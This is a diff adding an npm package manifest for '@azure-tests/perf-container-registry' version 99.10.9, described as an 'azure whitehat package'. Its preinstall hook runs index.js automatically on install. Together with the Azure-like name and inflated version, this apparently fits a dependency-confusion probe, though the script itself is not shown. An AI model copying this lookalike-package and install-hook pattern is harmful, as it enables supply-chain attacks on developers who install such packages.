@@ -1,0 +1,39 @@
+{
+    "name": "@azure-tests/perf-container-registry",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "@azure-tests/perf-container-registry@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-U8pb5SmmNCLafchPBiaB29dXaKXGWEecCFMm/W7swOkF4DNLXdHA032pr39BbPp1GPI/Fz0Bsab9KHQoEYntTw==",
+        "shasum": "488db41239aee99e2652c55789ae3a25bd5d6de2",
+        "tarball": "https://registry.npmjs.org/@azure-tests/perf-container-registry/-/perf-container-registry-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3600,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhoRZ/CRA9TVsSAnZWagAA0dUQAIyL8x0Yw0MoX138Sp3u\naiKmFq/Nnbsp0VpKDmorjslpQ889rZCP0ZmX20M3SEKy/pyo9EH3+Q6qInyI\nzh5VOhmupMyWAjBudqyzXfHaNk+muFLCGLbJ4XlaegrG93F0/k1WfdKnFRDO\nqow7uM/5LZWLBoBvr2tklZrNfuX4/FJhk0UbZVQK61Jayn9lLIWPwUMENrpO\nsp/L58Z4F8fgMNvoak7bJEg5CeXtP6fH4buuUmPYE16983toiGam9p1REEoq\nEjSvJBvwnvqldnHYLhvFtxa+2ZT8Burt/Q3gHPjLmn+jmJp2PSA3TXsgijNS\nIM7tSRpK/MdYNen9iB7E6HFhxFHV6rN+stvstQdBy1WjxT2iVrgeb8GHIabm\nc5pLCv4nQjd/LMPfL2OPblS7UuPECgugaIMDwSHZlHE4R/sjuoLpBEwdLf+X\nEc55Lv7LelX/CGX67kyqIcZMpcomYmGjObG3kCpXltp2C/6g6JnPGSAKP0NI\n3/nKd234BxfP/mWkTa0anbSqmB+8AwSnpWS8VwugB/OwrdOvdisuiGVL2e8Z\ni8dksGeNahbsTr9W9Kzgu5me6Eq0f4fzBghzLcTlRTFpmUOYeJ+Ig/N3i3bP\n7Bcpf/VgeoOc+Ty0tNA+Jw5TlpfjKHpIA60JgmfK8HU96JW96y3rV7pULwU3\nCk7U\r\n=z22G\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "azure-tests",
+        "email": "hussam.tes08+3@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "azure-tests",
+            "email": "hussam.tes08+3@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/perf-container-registry_99.10.9_1637947007816_0.43804419114754545"
+    },
+    "_hasShrinkwrap": false
+}
